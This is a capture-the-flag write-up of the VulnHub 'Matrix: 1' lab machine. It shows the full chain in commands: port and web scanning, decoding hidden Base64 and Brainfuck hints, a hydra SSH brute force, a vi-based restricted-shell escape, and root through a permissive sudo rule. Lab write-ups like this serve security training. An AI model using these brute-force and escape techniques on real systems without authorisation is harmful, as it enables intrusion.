# Matrix: 1 — VulnHub Writeup

**Platform:** VulnHub  
**Difficulty:** Medium  
**Author:** Shahid  
**Date:** June 2026  
**Goal:** Get root and read `/root/flag.txt`

---

## Summary

Matrix is a boot2root machine themed around the movie. The attack chain involves web enumeration, multi-stage decoding (Base64 → Brainfuck), SSH login into a restricted bash jail, rbash escape via `vi`, PATH restoration, and privilege escalation through a severe sudo misconfiguration.

---

## Reconnaissance

### Nmap

```bash
nmap -sV -p- 192.168.1.13
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)
80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
```

Three open ports: SSH on 22 and two HTTP servers on 80 and 31337 (port 31337 is "elite" in hacker culture — a hint the interesting stuff is there).

---

### Gobuster

```bash
gobuster dir -u http://192.168.1.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
```

```
/index.html    (Status: 200) [Size: 3734]
/assets        (Status: 301) [Size: 0]
```

Nothing immediately useful on port 80.

---

### Nikto

```bash
nikto -h http://192.168.1.13
```

Confirmed outdated software: `SimpleHTTP/0.6` and `Python/2.7.14`. Missing security headers noted. No critical findings from Nikto alone.

---

## Web Enumeration

### Port 80

Visited `http://192.168.1.13` — standard Matrix-themed landing page. Nothing in the source code.

### Port 31337

Visited `http://192.168.1.13:31337` — similar page. Inspected the page source and found a hidden HTML comment:

```html
<!--p class="service__text">ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=</p-->
```

The long string is **Base64 encoded**. Decoded it:

```bash
echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d
```

Output:

```
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

This hints at a file called `Cypher.matrix` on the server.

---

## Cypher.matrix — Brainfuck Decode

Visited `http://192.168.1.13:31337/Cypher.matrix` and downloaded a file full of `+`, `-`, `<`, `>`, `[`, `]`, `.` characters — **Brainfuck**, an esoteric programming language.

Ran it through a Brainfuck interpreter (CyberChef works perfectly for this). Output:

```
You can enter into matrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
```

We have a username (`guest`) and a partial password (`k1ll0rXX`). The last two characters are unknown.

---

## Cracking the Password

Generated a wordlist using `crunch` for all alphanumeric combinations of the last two characters and brute forced SSH with Hydra:

```bash
crunch 9 9 -t k1ll0r@@ -o matrix_pass.txt
hydra -l guest -P matrix_pass.txt ssh://192.168.1.13
```

Valid credentials found:

```
guest : k1ll0r7n
```

---

## Initial Access — rbash Jail

```bash
ssh guest@192.168.1.13
```

Logged in successfully but immediately hit a **restricted bash (rbash)** shell. Every command failed:

```
-rbash: id: command not found
-rbash: whoami: command not found
-rbash: sudo: command not found
```

Checked the PATH:

```bash
echo $PATH
/home/guest/prog
```

PATH was locked to a single directory. Checked what was inside:

```bash
echo /home/guest/prog/*
/home/guest/prog/vi
```

Only one binary available: `vi`.

---

## rbash Escape via vi

Launched `vi` and used it to spawn a shell directly:

```
vi
:!/bin/bash
```

This executes `/bin/bash` from within vi, completely bypassing rbash restrictions. Dropped into a bash shell as `guest`.

---

## PATH Restoration

Commands still failed because PATH was still broken. Reset it to standard system directories:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now all commands work:

```bash
id
uid=1000(guest) gid=100(users) groups=100(users),7(lp),11(floppy)...

whoami
guest
```

---

## Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

```
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
```

`(ALL) ALL` — guest can run any command as any user with no password. Instant root:

```bash
sudo su
```

```
root@porteus:/home/guest#
```

---

## Flag

```bash
cat /root/flag.txt
```

```
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
|`-._`-.\,-'_|  _,-'.                                               
     `-.|.-' | |`.-'|_     WHAT                                     
        |      |_|,-'_`.                                            
              |-._,-'  |     NO, ME NEITHER                         
         jrei | |    _,'                                            
              '-|_|,-'          IT'S JUST A HYPOTHETICAL QUESTION
```

---

## Attack Chain Summary

| Step | Technique |
|------|-----------|
| Port discovery | Nmap full port scan |
| Web recon | Gobuster, Nikto, manual source inspection |
| Credential discovery | Base64 decode → Brainfuck decode |
| Password cracking | Hydra SSH brute force |
| Initial access | SSH as guest |
| rbash escape | `vi` → `:!/bin/bash` |
| Environment fix | `export PATH=...` |
| Privilege escalation | Sudo misconfiguration `(ALL) ALL` |
| Root | `sudo su` |

---

## Key Lessons

- **Always inspect page source manually** — automated tools miss HTML comments
- **Identify encodings visually** — Base64 looks like random alphanumeric with `=` padding; Brainfuck is only `+-<>[].,`
- **CyberChef** is your best friend for unknown encodings — bookmark `gchq.github.io/CyberChef`
- **rbash escape via vi** — when `vi` is the only binary available, `:!/bin/bash` spawns a full shell
- **Always fix PATH after escaping a restricted shell** — `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
- **`sudo -l` is always the first privesc check** — `(ALL) ALL` is an instant root

---

*Part of my VulnHub writeup series: [github.com/Shahid-git-09/vulnhub-writeups](https://github.com/Shahid-git-09/vulnhub-writeups)*
